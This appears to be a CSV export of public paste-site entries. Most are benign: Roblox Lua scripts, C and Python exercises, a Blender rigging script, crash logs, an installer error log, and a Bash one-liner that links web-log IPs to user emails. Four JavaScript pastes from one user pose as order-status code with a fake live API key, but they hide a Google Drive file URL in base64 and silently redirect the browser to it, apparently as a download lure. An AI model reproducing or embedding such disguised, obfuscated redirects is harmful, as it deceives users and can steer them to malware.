id,title,username,language,date,content
RXXX49gv,Untitled,Andresleo2573,Bash,Monday 7th of April 2025 10:05:43 AM CDT,"find /var/log/apache2/ -type f -name '*.log' ! -name '*error*' -exec grep proxy.pac {} \; | sort| cut -d"" "" -f1| uniq | while read ip; do resultado=$(mysql expedientes -se ""select u.direccion_ip ,u.usuario, u.email from usuarios_actividad ua left join usuarios u ON u.id_usuario  = ua.id_usuario where ua.ip = '$ip'  order by id_actividad desc  limit 1;""); if [[ ""$resultado"" != *""NULL""* ]]; then echo ""$resultado"";  fi; done > ip_usuario_email.txt"
9Wury0Pf,Click GUI,Parallaxox,Lua,Monday 7th of April 2025 09:56:50 AM CDT,"--https://youtu.be/j5h2DvXeHEU

local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild(""PlayerGui"")

local screenGui = Instance.new(""ScreenGui"")
screenGui.Name = ""ClickGui""
screenGui.Parent = playerGui


local clickButton = Instance.new(""TextButton"")
clickButton.Size = UDim2.new(0.2,0,0.1,0)
clickButton.Position = UDim2.new(0.02,0,0.45,0)
clickButton.BackgroundColor3 = Color3.fromRGB(50,150,255)
clickButton.TextColor3 = Color3.fromRGB(255,255,255)
clickButton.Font = Enum.Font.SourceSansBold
clickButton.TextSize = 24
clickButton.Text = ""Click Me""
clickButton.Parent = screenGui


local countLabel = Instance.new(""TextLabel"")
countLabel.Size = UDim2.new(0.2,0,0.08,0)
countLabel.Position = UDim2.new(0.02, 0, 0.35, 0)
countLabel.BackgroundColor3 = Color3.fromRGB(0,0,0)
countLabel.TextColor3 = Color3.fromRGB(255,255,255)
countLabel.Font = Enum.Font.SourceSansBold
countLabel.TextSize = 24
countLabel.Text = ""Clicks: 0""
countLabel.Parent = screenGui

local clickCount = 0

local function updateCounter()
	countLabel.Text = ""Clicks: "".. clickCount
end

clickButton.MouseButton1Click:Connect(function()
	clickCount = clickCount + 1
	updateCounter()
end)"
tR6uaMJ8,Untitled,dllbridge,C,Monday 7th of April 2025 09:39:57 AM CDT,"
#include  <iostream>
//#include    <cstring>
using namespace std;


/////////////////////////////////////
int main()
{
	
	string s1 =      ""SONY"", 
	       s2 = "" Pictures"";
	
	string s3 = s1 + s2; 
	
	cout << s3 << endl;	
}



"
rMkaTEFB,asd,ladokhamuji,Python,Monday 7th of April 2025 09:37:04 AM CDT,"total_price = 0
item_count = 0
items = []
discount = 0
delivery_fee = 0
print(""If you have short item or want to end in half way then press 0"")
print()
while item_count < 10:

    print(""Enter the price of the item (only positive number is accepted:"")
    price = float(input())

    if price == 0:
        break
    elif price < 0:
        print(""Not valid ! price should be in positive number only."")
        continue

    print(""Enter the name of the item:"")
    item_name = input()
    print(""Enter the quantity of the item (positive number only):"")
    quantity = int(input())

    if quantity <= 0:
        print(""Error: Quantity must be positive."")
        continue

    items.append({
        ""name"": item_name,
        ""price"": price,
        ""quantity"": quantity
    })

    total_price += price * quantity
    item_count += 1

if total_price == 0:
    print(""Error: No valid items entered. Please retry."")
else:
    if total_price > 100:
        discount = total_price * 0.1
        total_"
xqPtSjnu,VexUpdatedRig IK/FK Script,Velepexon,Python,Monday 7th of April 2025 09:34:41 AM CDT,"# THIS SCRIPT WAS GENERATED BY CHATGPT
# 
import bpy

# Mapping for IK to FK
ik_to_fk_map = {
    ""FK_Arm_1_L"": ""IK-TO-FK-SNAP_ARM_1_L"",
    ""FK_Arm_2_L"": ""IK-TO-FK-SNAP_ARM_2_L"",
    ""FK_Wrist_L"": ""IK-TO-FK-SNAP_WRIST_L"",
    ""FK_Leg_1_L"": ""IK-TO-FK-SNAP_LEG_1_L"",
    ""FK_Leg_2_L"": ""IK-TO-FK-SNAP_LEG_2_L"",
    ""FK_Ankle_L"": ""IK-TO-FK-SNAP_ANKLE_L"",

    ""FK_Arm_1_R"": ""IK-TO-FK-SNAP_ARM_1_R"",
    ""FK_Arm_2_R"": ""IK-TO-FK-SNAP_ARM_2_R"",
    ""FK_Wrist_R"": ""IK-TO-FK-SNAP_WRIST_R"",
    ""FK_Leg_1_R"": ""IK-TO-FK-SNAP_LEG_1_R"",
    ""FK_Leg_2_R"": ""IK-TO-FK-SNAP_LEG_2_R"",
    ""FK_Ankle_R"": ""IK-TO-FK-SNAP_ANKLE_R"",
}

# Mapping for FK to IK
fk_to_ik_map = {
    ""Wrist_IK_L"": ""FK-TO-IK-SNAP_WRIST_IK_L"",
    ""POLE_Elbow_L"": ""FK-TO-IK-SNAP_POLE_ELBOW_L"",
    ""CTRL_FOOT_L"": ""FK-TO-IK-SNAP_CTRL_FOOT_L"",
    ""POLE_Knee_L"": ""FK-TO-IK-SNAP_POLE_KNEE_L"",

    ""Wrist_IK_R"": ""FK-TO-IK-SNAP_WRIST_IK_R"",
    ""POLE_Elbow_R"": ""FK-TO-IK-SNAP_POLE_ELBOW_R"",
    ""CTRL_FOOT_R"": ""FK-TO-IK-SNAP_CTRL_FOOT_R"",
    ""POLE_Knee_R"": ""FK-TO-IK-SNAP_POLE_KNEE_R"",
}

def snap_and_bake(snap_map):
    obj = bpy.context.object
    if obj.mode != 'POSE':
        bpy.ops.object.mode_set(mode='POSE')

    frame = bpy.context.scene.frame_current

    for target_bone, source_bone in snap_map.items():
        try:
            pbone = obj.pose.bones[target_bone]
            source = obj.pose.bones[source_bone]

            # Add Copy Transforms
            constraint = pbone.constraints.new(type='COPY_TRANSFORMS')
            constraint.name = ""TEMP_Snap""
            constraint.target = obj
            constraint.subtarget = source.name

            # Select the bone
            for b in obj.data.bones:
                b.select = False
            obj.data.bones[target_bone].select = True
            bpy.context.view_layer.objects.active = obj

            # Bake the frame
            bpy.ops.nla.bake(
                frame_start=frame,
                frame_end=frame,
                only_selected=True,
                visual_keying=True,
                clear_constraints=False,
                clear_parents=False,
                use_current_action=True,
                bake_types={'POSE'}
            )

            # Remove ONLY the Copy Transforms constraint we just added
            for con in reversed(pbone.constraints):
                if con.type == 'COPY_TRANSFORMS' and con.name == ""TEMP_Snap"":
                    pbone.constraints.remove(con)
                    break

        except KeyError:
            print(f""Bone {target_bone} or {source_bone} not found, skipping."")

# --- Run based on selection
def main():
    selected = [b.name for b in bpy.context.selected_pose_bones]
    to_run = {}

    # Handle IK to FK
    for tgt, src in ik_to_fk_map.items():
        if tgt in selected or src in selected:
            to_run[tgt] = src

    # Handle FK to IK
    for tgt, src in fk_to_ik_map.items():
        if tgt in selected or src in selected:
            to_run[tgt] = src

    snap_and_bake(to_run)

main()"
FiwzNnrJ,How to Double Jump,Parallaxox,Lua,Monday 7th of April 2025 09:17:43 AM CDT,"--https://youtu.be/z0CfDQ9zy0o
local UserInputService = game:GetService(""UserInputService"")
local Players = game:GetService(""Players"")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild(""Humanoid"")
local rootPart = character:WaitForChild(""HumanoidRootPart"")

local jumpHeight = 100
local canDoubleJump = false
local hasDoubleJumped = false

humanoid.StateChanged:Connect(function(_, newState)
	if newState == Enum.HumanoidStateType.Landed then
		canDoubleJump = false
		hasDoubleJumped = false
	end
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then return end

	if input.KeyCode == Enum.KeyCode.Space then
		if humanoid:GetState() == Enum.HumanoidStateType.Freefall and canDoubleJump and not hasDoubleJumped then
			hasDoubleJumped = true
			rootPart.Velocity = Vector3.new(rootPart.Velocity.X, jumpHeight, rootPart.Velocity.Z)
		elseif humanoid:GetState() ~= Enum.HumanoidStateType.Freefall then
			canDoubleJump = true
		end
	end
end)
"
PAhCNhc6,Products.js,dentira,JavaScript,Monday 7th of April 2025 09:02:27 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/40979/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3PPbqdvm,7-4-25 Funciones,Aluneth,C,Monday 7th of April 2025 08:56:08 AM CDT,"7-4-2025 Funciones

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Desarrollar un programa con dos funciones aparte de la main. La primer solicite el ingreso de un entero y muestre el cuadrado de dicho valor.
La segunda que solicite la carga de dos valores y muestre el producto de los mismos. Llamar desde la main a ambas funciones. */
void cuadrado()
{
    float numero, cuadrado;
    printf(""Ingrese un numero para calcular su cuadrado: "");
    scanf(""%f"", &numero);
    cuadrado = numero * numero;
    printf(""El cuadrado de %.2f es: %.2f\n\n"", numero, cuadrado);

}

void producto()
{
    float num1, num2, prod;
    printf(""Ingrese un numero: "");
    scanf(""%f"", &num1);
    printf(""Ingrese otro numero: "");
    scanf(""%f"", &num2);
    prod = num1 * num2;
    printf(""El producto de %.f y %.f es: %.f"", num1, num2, prod);

}

int main()
{

    cuadrado();
    producto();

    return 0;
}



#include <stdio.h>
#include <stdlib.h>

/* Desarrollar una función que solicite la carga de tres valores y muestre el menor.
 la función main llamar 3 veces a dicha función.*/

void mostrarMenor()
{
    int num1, num2, num3, menor;
    printf(""Ingrese el numero 1: "");
    scanf(""%d"", &num1);
    printf(""Ingrese el numero 2: "");
    scanf(""%d"", &num2);
    printf(""Ingrese el numero 3: "");
    scanf(""%d"", &num3);

    if (num1 < num2 && num1 < num3)
    {
        printf(""\nEl menor de los numeros es: %d"", num1);
    }
    else if (num2 < num3)
    {
        printf(""\nEl menor de los numeros es: %d"", num2);
    }
    else
    {
        printf(""\nEl menor de los numeros es: %d"", num3);
    }


}

int main()
{
    mostrarMenor();
    mostrarMenor();
    mostrarMenor();
    return 0;
}



#include <stdio.h>
#include <stdlib.h>

void mostrarMayor(int v1, int v2)
{
    if (v1 > v2)
    {
        printf(""El mayor es: %d"", v1);
    }
    else
    {
        printf(""El mayor es: %d"", v2);
    }
}

int main()
{
    int numero1, numero2;
    printf(""Ingrese el numero 1: "");
    scanf(""%d"", &numero1);
    printf(""Ingrese el numero 2: "");
    scanf(""%d"", &numero2);
    mostrarMayor(numero1, numero2);

    return 0;
}



#include <stdio.h>
#include <stdlib.h>

/* Confeccionar un programa que solicite el pago por hora de un empleado y la cantidad de horas trabajadas
dentro de una estructura repetitiva en la función main. Elaborar una función que reciba como parámetro el
valor de la hora y la cantidad de horas trabajadas y nos muestre el total a pagar.*/

void calculaSueldo (float sueldoH, float horasT)
{
    float sueldoTotal = sueldoH * horasT;
    printf(""El sueldo total es de: %.2f"", sueldoTotal);
}

int main()
{

    float sueldoHora, horas;
    char opcion;
    do
    {
        printf(""Ingrese el pago por hora del empleado: "");
        scanf(""%f"", &sueldoHora);
        printf(""Ingrese la cantidad de horas trabajadas: "");
        scanf(""%f"", &horas);
        calculaSueldo(sueldoHora, horas);
        printf(""\n\nDesea realizar otra carga: [s/n]"");
        scanf("" %c"", &opcion);
    }
    while (opcion == 's');
    return 0;
}



#include <stdio.h>
#include <stdlib.h>

void buscarVocal (char caracter)
{
    if (caracter == 'a' || caracter == 'e' || caracter == 'i' || caracter == 'o' | caracter == 'u' || caracter == 'A' || caracter == 'E' | caracter == 'I' || caracter == 'O' || caracter == 'U')
    {
        printf(""\n%c es una vocal. "", caracter);
    }
    else
    {
        printf(""\n%c no es una vocal. "", caracter);
    }
}

int main()
{

    char let;
    printf(""Ingrese un caracter: "");
    scanf(""%c"", &let);
    buscarVocal (let);

    return 0;
}
"
PZuEQAct,2025-04-07T15:47:10.440830,powerampache,PHP,Monday 7th of April 2025 08:47:11 AM CDT,"1.01-79 (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /192.168.88.7 (port 80) from /10.13.82.66 (port 48378) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

getAlbumsStats() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.13.82.66 (port 48378) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.13.82.66 (port 48378) after 15000ms\"" }"",""stackTrace"":[]}"
21gt2j9A,2025-04-07T15:47:10.434252,powerampache,PHP,Monday 7th of April 2025 08:47:11 AM CDT,"1.01-79 (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /192.168.88.7 (port 80) from /10.13.82.66 (port 48372) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

getGenres() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.13.82.66 (port 48372) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.13.82.66 (port 48372) after 15000ms\"" }"",""stackTrace"":[]}"
aTqhnu8J,2025-04-07T15:46:55.273574,powerampache,PHP,Monday 7th of April 2025 08:46:56 AM CDT,"1.01-79 (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /192.168.88.7 (port 80) from /10.13.82.66 (port 49444) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

scrobble() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.13.82.66 (port 49444) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.13.82.66 (port 49444) after 15000ms\"" }"",""stackTrace"":[]}"
gXn8ADTi,Order.js,dentira,JavaScript,Monday 7th of April 2025 08:46:43 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56831/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zfy21nkT,Untitled,thewitchking,Java,Monday 7th of April 2025 08:43:57 AM CDT,"public int solution(String typedText) {
        int upperSum = 0;
        int lowerSum = 0;

        for (char ch : typedText.toCharArray()) {
            if (Character.isUpperCase(ch)) {
                upperSum ++;
            } else if (Character.isLowerCase(ch)) {
                lowerSum ++;
            }
        }

        return upperSum - lowerSum;
    }"
pNwVgkUG,WebUi crash before Python is too recent,loloof64,Bash,Monday 7th of April 2025 08:43:14 AM CDT,"➜  stable_diffusion ./webui.sh                            

################################################################
Install script for stable-diffusion + Web UI
Tested on Debian 11 (Bullseye), Fedora 34+ and openSUSE Leap 15.4 or newer.
################################################################

################################################################
Running on laurent user
################################################################

################################################################
Create and activate python venv
################################################################

################################################################
Launching launch.py...
################################################################
glibc version is 2.39
Check TCMalloc: libtcmalloc_minimal.so.4
libtcmalloc_minimal.so.4 is linked with libc.so,execute LD_PRELOAD=/lib/x86_64-linux-gnu/libtcmalloc_minimal.so.4
=============================================================================================
INCOMPATIBLE PYTHON VERSION

This program is tested with 3.10.6 Python, but you have 3.12.3.
If you encounter an error with ""RuntimeError: Couldn't install torch."" message,
or any other error regarding unsuccessful package (library) installation,
please downgrade (or upgrade) to the latest version of 3.10 Python
and delete current Python and ""venv"" folder in WebUI's directory.

You can download 3.10 Python from here: https://www.python.org/downloads/release/python-3106/



Use --skip-python-version-check to suppress this warning.
=============================================================================================
Python 3.12.3 (main, Feb  4 2025, 14:48:35) [GCC 13.3.0]
Version: v1.10.1
Commit hash: 82a973c04367123ae98bd9abdf80d9eda9b910e2
Installing torch and torchvision
Looking in indexes: https://pypi.org/simple, https://download.pytorch.org/whl/cu121
ERROR: Could not find a version that satisfies the requirement torch==2.1.2 (from versions: 2.2.0, 2.2.0+cu121, 2.2.1, 2.2.1+cu121, 2.2.2, 2.2.2+cu121, 2.3.0, 2.3.0+cu121, 2.3.1, 2.3.1+cu121, 2.4.0, 2.4.0+cu121, 2.4.1, 2.4.1+cu121, 2.5.0, 2.5.0+cu121, 2.5.1, 2.5.1+cu121, 2.6.0)
ERROR: No matching distribution found for torch==2.1.2
Traceback (most recent call last):
  File ""/home/laurent/Programmes/Programmation/ia/stable_diffusion/stable-diffusion-webui/launch.py"", line 48, in <module>
    main()
  File ""/home/laurent/Programmes/Programmation/ia/stable_diffusion/stable-diffusion-webui/launch.py"", line 39, in main
    prepare_environment()
  File ""/home/laurent/Programmes/Programmation/ia/stable_diffusion/stable-diffusion-webui/modules/launch_utils.py"", line 381, in prepare_environment
    run(f'""{python}"" -m {torch_command}', ""Installing torch and torchvision"", ""Couldn't install torch"", live=True)
  File ""/home/laurent/Programmes/Programmation/ia/stable_diffusion/stable-diffusion-webui/modules/launch_utils.py"", line 116, in run
    raise RuntimeError(""\n"".join(error_bits))
RuntimeError: Couldn't install torch.
Command: ""/home/laurent/Programmes/Programmation/ia/stable_diffusion/stable-diffusion-webui/venv/bin/python"" -m pip install torch==2.1.2 torchvision==0.16.2 --extra-index-url https://download.pytorch.org/whl/cu121
Error code: 1
"
xHZHRXTi,Market.js,dentira,JavaScript,Monday 7th of April 2025 08:31:22 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/12213/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
K9x60tzC,Untitled,dentira,JavaScript,Monday 7th of April 2025 08:15:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/83704/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
vfnvwcu0,2025-04-07T15:14:41.771068,powerampache,PHP,Monday 7th of April 2025 08:14:41 AM CDT,"1.01-79-play (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:230)
	at android.os.Looper.loop(Looper.java:319)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":57},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":252697085,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":230,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":319,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}]}"
